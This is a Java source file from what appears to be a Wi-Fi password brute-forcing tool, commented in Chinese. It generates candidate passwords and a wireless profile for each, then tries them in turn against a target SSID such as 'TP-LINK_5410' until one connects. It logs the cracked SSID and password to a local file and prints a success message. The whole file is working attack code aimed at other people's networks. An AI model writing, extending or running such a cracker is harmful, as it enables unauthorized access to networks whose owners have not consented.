package io.github.weechang;

import io.github.weechang.cmd.WlanExecute;
import io.github.weechang.config.FileConfig;
import io.github.weechang.config.Generetor;
import io.github.weechang.generetor.PasswordGeneretor;
import io.github.weechang.generetor.ProfileGeneretor;
import io.github.weechang.util.FileUtils;

import java.util.List;

/**
 * 连接配置文件
 */
public class Connector {

    /**
     * 生成密码
     */
    public static void genPassword(Generetor generetor) {
        PasswordGeneretor.genPassword(generetor);
    }

    /**
     * 生成配置文件
     */
    public static void genProfile(String ssid, Generetor generetor) {
        ProfileGeneretor profileGeneretor = new ProfileGeneretor(ssid, generetor);
        profileGeneretor.genProfile();
    }

    /**
     * 根据密码验证配置文件
     */
    public static String check(String ssid, Generetor generetor) {
        String password = null;
        List<String> passwordList = null;
        int counter = 0;
        outer:
        while (true) {
            int start = counter * FileConfig.PASSWORD_SIZE;
            int end = (counter + 1) * FileConfig.PASSWORD_SIZE - 1;
            passwordList = PasswordGeneretor.getPassword(generetor, start, end);
            if (passwordList != null && passwordList.size() > 0) {
                for (int i = 0; i < passwordList.size(); i++) {
                    String profileName = passwordList.get(i) + ".xml";
                    boolean checked = WlanExecute.check(ssid, profileName);
                    if (checked) {
                        password = passwordList.get(i);
                        break outer;
                    }
                }
                counter++;
            } else {
                break outer;
            }
        }
        return password;
    }


    /**
     * 整体步骤如下：
     * <p>
     * -- step1. 批量生成密码
     * -- step2. 根据密码批量生成配置文件
     * -- step3. 根据密码一个一个配置文件验证，直到找到正确的密码
     */
    public static void main(String[] args) {
        long start = System.currentTimeMillis();
//        Generetor generetor = Generetor.MOST_USE;
        Generetor generetor = Generetor.FIRST_MOST_COUPLE;


        String ssid = "TP-LINK_5410";
//        String ssid = "ChinaNet-WWS2";

        // step1
//        genPassword(generetor);
        // step2
//        genProfile(ssid, generetor);
        // step3
        String password = check(ssid, generetor);

        long end = System.currentTimeMillis();
        System.out.println("耗时：" + (end - start) / 1000 + "秒");
        if (password != null) {
            System.out.println("无线网络破解成功，密码：" + password);
            String record = "ssid:" + ssid + ",password:" + password;
            FileUtils.appendToFile("D:\\wlan\\record.txt" ,record);
        } else {
            System.out.println("无线网络破解失败");
        }

    }


}
